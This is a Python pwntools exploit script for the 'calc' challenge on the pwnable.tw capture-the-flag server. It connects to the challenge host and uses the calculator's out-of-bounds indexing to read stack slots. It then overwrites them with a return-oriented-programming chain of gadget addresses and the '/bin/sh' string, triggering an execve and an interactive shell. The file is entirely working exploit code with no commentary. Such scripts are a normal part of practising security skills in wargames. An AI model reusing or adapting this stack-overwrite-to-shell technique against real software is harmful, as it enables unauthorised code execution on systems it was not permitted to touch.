from pwn import *

HOST = 'chall.pwnable.tw'

PORT = 10100

vals=[0x0805c34b,11,0x080701aa,0,0x080701d1,0,1,0x08049a21,0x6e69622f,0x0068732f]

con = remote(HOST,PORT)

print con.recv()

start=361

for i in range(0,6):

    con.send('+'+str(start+i)+'\n')

    val=int(con.recv(1024))

    diff=vals[i]-val

    if diff<0:

        con.send('+'+str(start+i)+str(diff)+'\n')

    else:

        con.send('+'+str(start+i)+'+'+str(diff)+'\n')

    resl=int(con.recv(1024))

    print (str(start+i)+': '+'%s'%hex(resl))

#addr of '/bin/sh'

con.send('+360'+'\n')

mebp=int(con.recv(1024))

mstacksize=mebp+0x100000000-((mebp+0x100000000) & 0xFFFFFFF0-16)

bin_sh_addr=mebp+(8-(24/4+1))*4

con.send('+367'+'\n')

val_367=int(con.recv(1024))

diff_367=bin_sh_addr-val_367

con.send('+367'+str(diff_367)+'\n')

resl=int(con.recv(1024))+0x100000000

print ('367: '+'%s'%hex(resl))

for i in range(7,10):

    con.send('+'+str(start+i)+'\n')

    val=int(con.recv(1024))

    diff=vals[i]-val

    if diff<0:

        con.send('+'+str(start+i)+str(diff)+'\n')

    else:

        con.send('+'+str(start+i)+'+'+str(diff)+'\n')

    resl=int(con.recv(1024))

    print (str(start+i)+': '+'%s'%hex(resl))

con.send('Give Me Shell!\n')

con.interactive("\nshell# ")

con.close()
